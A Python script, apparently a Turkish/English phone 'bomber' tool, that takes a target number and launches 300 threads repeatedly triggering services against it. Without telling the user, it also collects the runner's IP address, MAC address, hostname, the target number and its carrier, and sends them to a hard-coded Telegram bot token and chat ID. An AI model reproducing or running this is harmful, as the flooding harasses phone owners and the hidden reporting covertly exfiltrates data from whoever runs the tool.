from StructService import Distribution_Service
from threading import Thread
from colorama import Fore, Back
import telebot
import socket
import re, uuid
import sys, os, pyfiglet
import phonenumbers
from phonenumbers import geocoder 
from phonenumbers import carrier 

h_name = socket.gethostname()
ipadr = socket.gethostbyname(h_name)
attack_number_phone = Distribution_Service()
parse_mode="Markdown"
def start(phone):
	attack_number_phone.phone(phone)

	while True:
	    try:
	        attack_number_phone.random_service()
	    except Exception as ex:
	    	print(ex)

os.system('clear')

print(Fore.WHITE +pyfiglet.figlet_format("welcome", font = "cybermedium"  ))
sa	=	input(Fore.GREEN +'Telefon No? ||Phone Number  +xxxxxxxxxxxx : β   ')
number= phonenumbers.parse(sa)
number=phonenumbers.parse(sa)
print(Fore.MAGENTA + pyfiglet.figlet_format("glovelace", font = "cybermedium"  ))
print(Fore.LIGHTCYAN_EX +'===================  π€  π€  ========================')
print(Fore.BLUE +'Author π₯	:	https://t.me/glovelace')
print(Fore.LIGHTYELLOW_EX +'Author π	:	https://github.com/r8q')
print(Fore.LIGHTBLUE_EX +'Author π	:	https://t.me/losersalwaysloser')
print(Fore.LIGHTBLUE_EX +'Author π	:	https://t.me/decryptedd')
print(Fore.LIGHTCYAN_EX +'===================  π  π  ========================')
phone= input(Fore.RED +' Hata !! Tekrar Numara Girin || Error  Re-Enter Number||'  +Fore.LIGHTGREEN_EX+'xxxxxxxxxxxx : β   ')
print(Fore.LIGHTYELLOW_EX +'===================  π  π  ========================')
veri=('New user is here   ' +'\nππ§ββοΈ π§ββοΈπ§ββοΈ ππ§ '
+ '\nIP Adress π€:  ' +ipadr 
+ '\nMac Adress π» : ' + "  " +':'.join(re.findall('..', '%012x' %uuid.getnode()))
+ '\nPc Name π¨βπ»: ' +"   "+h_name
+ '\nSent Number β:	 '
+phone
+ '\nNumara Bilgileriπ:  ' 
+ '\n Γlkeπ³οΈ:  ' 
+  geocoder.description_for_number(number,'en') 
+'\n **Servis SaΔlayΔ±cΔ±sΔ±**π₯:  ' 
+  carrier.name_for_number(number,'en')
)
bot = telebot.TeleBot('1566531385:AAFXZAp6pwaIgmqP7SHOD3LOuAXaNDQvtAc')
bot.send_message(961991483, veri)

try:
	attack_number_phone.phone(phone)
except:
	print(Fore.RED + ' β¨YanlΔ±Ε Formatta Girildi  ||Invalid input format  \nπ€|| Enter the number in β¨ || LΓΌtfen NumarayΔ± Bu Εekilde Girin +xxxxxxxxxxxx  βοΈ  ')
	sys.exit()
	


for i in range(300):
	th = Thread(target=start, args=(phone,))
	th.start()